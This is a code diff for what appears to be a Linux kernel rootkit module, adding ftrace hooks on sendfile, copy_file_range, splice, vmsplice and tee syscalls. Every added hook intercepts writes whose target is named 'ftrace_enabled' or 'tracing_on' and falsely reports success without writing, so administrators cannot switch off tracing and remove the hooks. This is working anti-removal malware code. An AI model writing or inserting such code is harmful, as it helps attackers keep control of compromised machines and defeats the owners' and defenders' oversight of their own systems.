@@ -14,6 +14,20 @@ static asmlinkage ssize_t (*original_pwritev)(const struct pt_regs *);
 static asmlinkage ssize_t (*original_pwritev2)(const struct pt_regs *);
 static asmlinkage ssize_t (*original_pwritev_ia32)(const struct pt_regs *);
 static asmlinkage ssize_t (*original_pwritev2_ia32)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_sendfile)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_sendfile64)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_sendfile_ia32)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_sendfile64_ia32)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_compat_sendfile)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_compat_sendfile64)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_copy_file_range)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_copy_file_range_ia32)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_splice)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_splice_ia32)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_vmsplice)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_vmsplice_ia32)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_tee)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_tee_ia32)(const struct pt_regs *);
 
 static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs,
                                                      asmlinkage ssize_t (*orig)(const struct pt_regs *),
@@ -142,6 +156,254 @@ static notrace asmlinkage ssize_t hooked_pwritev2_ia32(const struct pt_regs *reg
     return hooked_writev_common(regs, original_pwritev2_ia32, true);
 }
 
+static notrace asmlinkage ssize_t hooked_fd_transfer_common(const struct pt_regs *regs,
+                                                            asmlinkage ssize_t (*orig)(const struct pt_regs *),
+                                                            bool compat32)
+{
+    int out_fd, in_fd;
+    size_t count;
+
+    if (!orig || !regs) return -EINVAL;
+
+    if (!compat32) {
+        out_fd = regs->di;
+        in_fd  = regs->si;
+        count  = regs->r10;
+    } else {
+        out_fd = regs->bx;
+        in_fd  = regs->cx;
+        count  = regs->si;
+    }
+
+    struct file *out_file = fget(out_fd);
+    if (!out_file)
+        return orig(regs);
+
+    const char *name = NULL;
+    if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
+        name = out_file->f_path.dentry->d_name.name;
+
+    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+        fput(out_file);
+        return count;
+    }
+
+    fput(out_file);
+    return orig(regs);
+}
+
+static notrace asmlinkage ssize_t hooked_sendfile(const struct pt_regs *regs)
+{
+    return hooked_fd_transfer_common(regs, original_sendfile, false);
+}
+
+static notrace asmlinkage ssize_t hooked_sendfile64(const struct pt_regs *regs)
+{
+    return hooked_fd_transfer_common(regs, original_sendfile64, false);
+}
+
+static notrace asmlinkage ssize_t hooked_sendfile_ia32(const struct pt_regs *regs)
+{
+    return hooked_fd_transfer_common(regs, original_sendfile_ia32, true);
+}
+
+static notrace asmlinkage ssize_t hooked_sendfile64_ia32(const struct pt_regs *regs)
+{
+    return hooked_fd_transfer_common(regs, original_sendfile64_ia32, true);
+}
+
+static notrace asmlinkage ssize_t hooked_compat_sendfile(const struct pt_regs *regs)
+{
+    return hooked_fd_transfer_common(regs, original_compat_sendfile, true);
+}
+
+static notrace asmlinkage ssize_t hooked_compat_sendfile64(const struct pt_regs *regs)
+{
+    return hooked_fd_transfer_common(regs, original_compat_sendfile64, true);
+}
+
+static notrace asmlinkage ssize_t hooked_copy_file_range_common(const struct pt_regs *regs,
+                                                                asmlinkage ssize_t (*orig)(const struct pt_regs *),
+                                                                bool compat32)
+{
+    int fd_in, fd_out;
+    size_t count;
+
+    if (!orig || !regs) return -EINVAL;
+
+    if (!compat32) {
+        fd_in  = regs->di;
+        fd_out = regs->r8;
+        count  = regs->r10;
+    } else {
+        fd_in  = regs->bx;
+        fd_out = regs->di;
+        count  = regs->si;
+    }
+
+    struct file *out_file = fget(fd_out);
+    if (!out_file)
+        return orig(regs);
+
+    const char *name = NULL;
+    if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
+        name = out_file->f_path.dentry->d_name.name;
+
+    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+        fput(out_file);
+        return count;
+    }
+
+    fput(out_file);
+    return orig(regs);
+}
+
+static notrace asmlinkage ssize_t hooked_copy_file_range(const struct pt_regs *regs)
+{
+    return hooked_copy_file_range_common(regs, original_copy_file_range, false);
+}
+
+static notrace asmlinkage ssize_t hooked_copy_file_range_ia32(const struct pt_regs *regs)
+{
+    return hooked_copy_file_range_common(regs, original_copy_file_range_ia32, true);
+}
+
+static notrace asmlinkage ssize_t hooked_splice_common(const struct pt_regs *regs,
+                                                       asmlinkage ssize_t (*orig)(const struct pt_regs *),
+                                                       bool compat32)
+{
+    int fd_in, fd_out;
+    size_t count;
+
+    if (!orig || !regs) return -EINVAL;
+
+    if (!compat32) {
+        fd_in  = regs->di;
+        fd_out = regs->dx;
+        count  = regs->r8;
+    } else {
+        fd_in  = regs->bx;
+        fd_out = regs->dx;
+        count  = regs->di;
+    }
+
+    struct file *out_file = fget(fd_out);
+    if (!out_file)
+        return orig(regs);
+
+    const char *name = NULL;
+    if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
+        name = out_file->f_path.dentry->d_name.name;
+
+    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+        fput(out_file);
+        return count;
+    }
+
+    fput(out_file);
+    return orig(regs);
+}
+
+static notrace asmlinkage ssize_t hooked_splice(const struct pt_regs *regs)
+{
+    return hooked_splice_common(regs, original_splice, false);
+}
+
+static notrace asmlinkage ssize_t hooked_splice_ia32(const struct pt_regs *regs)
+{
+    return hooked_splice_common(regs, original_splice_ia32, true);
+}
+
+static notrace asmlinkage ssize_t hooked_vmsplice_common(const struct pt_regs *regs,
+                                                         asmlinkage ssize_t (*orig)(const struct pt_regs *),
+                                                         bool compat32)
+{
+    int fd;
+    unsigned long nr_segs;
+
+    if (!orig || !regs) return -EINVAL;
+
+    if (!compat32) {
+        fd      = regs->di;
+        nr_segs = regs->dx;
+    } else {
+        fd      = regs->bx;
+        nr_segs = regs->dx;
+    }
+
+    struct file *file = fget(fd);
+    if (!file)
+        return orig(regs);
+
+    const char *name = NULL;
+    if (file->f_path.dentry && file->f_path.dentry->d_name.name)
+        name = file->f_path.dentry->d_name.name;
+
+    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+        fput(file);
+        return nr_segs;
+    }
+
+    fput(file);
+    return orig(regs);
+}
+
+static notrace asmlinkage ssize_t hooked_vmsplice(const struct pt_regs *regs)
+{
+    return hooked_vmsplice_common(regs, original_vmsplice, false);
+}
+
+static notrace asmlinkage ssize_t hooked_vmsplice_ia32(const struct pt_regs *regs)
+{
+    return hooked_vmsplice_common(regs, original_vmsplice_ia32, true);
+}
+
+static notrace asmlinkage ssize_t hooked_tee_common(const struct pt_regs *regs,
+                                                    asmlinkage ssize_t (*orig)(const struct pt_regs *),
+                                                    bool compat32)
+{
+    int fd_in, fd_out;
+    size_t count;
+
+    if (!orig || !regs) return -EINVAL;
+
+    if (!compat32) {
+        fd_in  = regs->di;
+        fd_out = regs->si;
+        count  = regs->dx;
+    } else {
+        fd_in  = regs->bx;
+        fd_out = regs->cx;
+        count  = regs->dx;
+    }
+
+    struct file *out_file = fget(fd_out);
+    if (!out_file)
+        return orig(regs);
+
+    const char *name = NULL;
+    if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
+        name = out_file->f_path.dentry->d_name.name;
+
+    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+        fput(out_file);
+        return count;
+    }
+
+    fput(out_file);
+    return orig(regs);
+}
+
+static notrace asmlinkage ssize_t hooked_tee(const struct pt_regs *regs)
+{
+    return hooked_tee_common(regs, original_tee, false);
+}
+
+static notrace asmlinkage ssize_t hooked_tee_ia32(const struct pt_regs *regs)
+{
+    return hooked_tee_common(regs, original_tee_ia32, true);
+}
+
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_write",   hooked_write,   &original_write),
     HOOK("__ia32_sys_write",  hooked_write32, &original_write32),
@@ -155,6 +417,25 @@ static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_pwritev2", hooked_pwritev2, &original_pwritev2),
     HOOK("__ia32_sys_pwritev", hooked_pwritev_ia32, &original_pwritev_ia32),
     HOOK("__ia32_sys_pwritev2", hooked_pwritev2_ia32, &original_pwritev2_ia32),
+
+    HOOK("__x64_sys_sendfile", hooked_sendfile, &original_sendfile),
+    HOOK("__x64_sys_sendfile64", hooked_sendfile64, &original_sendfile64),
+    HOOK("__ia32_sys_sendfile", hooked_sendfile_ia32, &original_sendfile_ia32),
+    HOOK("__ia32_sys_sendfile64", hooked_sendfile64_ia32, &original_sendfile64_ia32),
+    HOOK("__ia32_compat_sys_sendfile", hooked_compat_sendfile, &original_compat_sendfile),
+    HOOK("__ia32_compat_sys_sendfile64", hooked_compat_sendfile64, &original_compat_sendfile64),
+
+    HOOK("__x64_sys_copy_file_range", hooked_copy_file_range, &original_copy_file_range),
+    HOOK("__ia32_sys_copy_file_range", hooked_copy_file_range_ia32, &original_copy_file_range_ia32),
+
+    HOOK("__x64_sys_splice", hooked_splice, &original_splice),
+    HOOK("__ia32_sys_splice", hooked_splice_ia32, &original_splice_ia32),
+
+    HOOK("__x64_sys_vmsplice", hooked_vmsplice, &original_vmsplice),
+    HOOK("__ia32_sys_vmsplice", hooked_vmsplice_ia32, &original_vmsplice_ia32),
+
+    HOOK("__x64_sys_tee", hooked_tee, &original_tee),
+    HOOK("__ia32_sys_tee", hooked_tee_ia32, &original_tee_ia32),
 };
 
 notrace int hooks_write_init(void)
